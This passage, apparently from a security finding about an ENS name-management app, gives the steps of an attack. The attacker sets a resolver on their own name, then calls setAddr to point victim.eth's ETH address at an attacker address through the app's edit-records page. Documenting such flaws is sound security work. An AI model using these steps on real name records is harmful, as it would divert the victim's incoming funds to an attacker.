setAddr(namehash("victim.eth"), 60, attackerAddress)
```

```
plant : attacker calls setResolver(mallory.eth -> any other resolver) on their own name
fire  : attacker calls setAddr(victim.eth, 60, attackerAddress) through the app's own edit-records page
```
